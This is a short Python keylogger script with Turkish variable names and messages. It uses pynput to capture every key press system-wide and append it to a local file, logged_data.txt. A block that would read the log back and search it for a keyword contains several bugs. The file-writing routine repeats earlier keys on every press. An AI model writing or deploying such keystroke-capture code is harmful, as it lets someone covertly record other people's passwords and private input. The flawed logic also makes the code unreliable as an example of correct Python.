import pynput
from pynput.keyboard import Listener ,Key
import time

logs =[]
referans =[False,True]
def basildi(tus):
    global logs
    logs.append(tus)
    
    dosya_ac(logs)

    print("'{0}' tusuna basildi".format(tus))


def dosya_ac(logs):
    try:
        with open("logged_data.txt","a+") as dosya:
            for tus in logs:
                yeni_tus=str(tus).replace("'","")
                if yeni_tus.find("space") >0:
                    dosya.write(" ")
                elif yeni_tus.find("enter") >0:
                    dosya.write("\n")
                else:
                    dosya.write(yeni_tus)
        

    except Exception as msg:
        print("error establishing ProtoKOOL***"+str(msg))  


def birakildi(tus):
   
    global referans
    
    if tus==Key.esc:
        referans = False
        return referans

if referans == False:
    cevap =str(input("Dosyaya yazilan verileri okuyalim mi ?! [E/H]"))
    if cevap == "E":
        print("Tamam o halde...")
        time.sleep(2)

        with open("logged_data.txt","a+") as dosya:
            dosya.read()
            if "zafer" in dosya:
                print("***WELL***")
            else:
                print("we have found nothing sir***")
    elif cevap == "H":
        print("***Oyle olsun***")
    else:
        print("yanlis giris...")


if __name__ == "__main__":
    with Listener(on_press=basildi,on_release=birakildi) as dinle:
        dinle.join()


    